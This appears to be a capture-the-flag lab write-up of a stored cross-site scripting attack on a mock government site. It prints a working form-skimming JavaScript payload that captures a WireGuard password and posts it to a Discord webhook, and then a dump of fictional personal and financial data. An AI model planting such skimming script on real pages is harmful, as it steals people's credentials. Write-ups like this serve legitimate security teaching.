# Attack 3 - Cross-Site Scripting

In this attack I created a script in the JavaScript language and made the web server store it by using it as input on the webpage. This is in other words an attack which is called XSS (Cross-Site Scripting), and will allow me to retrieve confidential information on Jonas Dahl's wireguard password.

The following JavaScript code is what was used in order to fetch the wireguard credentials.
```JavaScript
<script>
  document.addEventListener("DOMContentLoaded", () => {
    document.getElementById("authForm").addEventListener("submit", function(event) {
      event.preventDefault();

      var password = document.getElementById("authPassword").value;

      var webhook_url = 'https://discord.com/api/webhooks/1184540771815272560/vHZepaE0mcSkjheuuDKDmo4gdpKLGM8wtaFJxlNFHbs2artJraMgfrpMtHE4TjgzOub6';

      var message_data = {
          content: 'WireGuard Password:\n' + password,
      };

      var json_data = JSON.stringify(message_data);

      var xhr = new XMLHttpRequest();
      xhr.open("POST", webhook_url, true);
      xhr.setRequestHeader("Content-Type", "application/json");

      xhr.onreadystatechange = function() {
          if (xhr.readyState === 4) {
              if (xhr.status === 200) {
                  console.log('Message sent to Discord successfully!');
              } else {
                  console.error('Error sending message to Discord.');
              }
          }
      };

      xhr.send(json_data);
    });
  });
</script>
```

Using this, the wireguard password was sent to my discord server where I then used it on the website and retrieved the wireguard credentials:
```json
{
  "name": "Jonas Dahl",
  "email": "jonas.dahl@regjeringen.no",
  "address": {
    "street": "Regjeringsgata 16",
    "city": "Oslo",
    "postal_code": "1111",
    "country": "Norway"
  },
  "phone": "+47 123 45 678",
  "birthdate": "1985-06-15",
  "gender": "Male",
  "national_id": "15068512345",
  "passport_number": "N12345678",
  "nationality": "Norwegian",
  "occupation": "Technical Officer",
  "company": {
    "name": "Regjeringen",
    "address": {
      "street": "Regjeringsgata 16",
      "city": "Oslo",
      "postal_code": "1111",
      "country": "Norway"
    },
    "phone": "+47 987 65 432",
    "industry": "Government",
    "position": "Technical Officer",
    "department": "Technical and Infrastructure",
    "start_date": "2010-05-01",
    "manager": "Ingrid Nilsen",
    "manger_username": "ingridnilsen"
  },
  "credit_card": {
    "type": "Visa",
    "number": "4111 2222 3333 4444",
    "expiration": "12/26",
    "cvv": "234",
    "cardholder_name": "Jonas Dahl"
  },
  "bank_account": {
    "bank_name": "Statens Bank",
    "account_number": "1234.56.78910",
    "iban": "NO1234567890123",
    "swift_bic": "STBANOXX"
  },
  "hidden_details": {
    "security_question": "Hva var navnet på din første lærer?",
    "security_answer": "Frøken Andersen",
    "pin": "5678",
    "mother_maiden_name": "Larsen"
  },
  "flag": "Dropbox is the flag :)",
  "dropbox": "https://dropbox.internal.regjeringen.uiaikt.no/"
}
```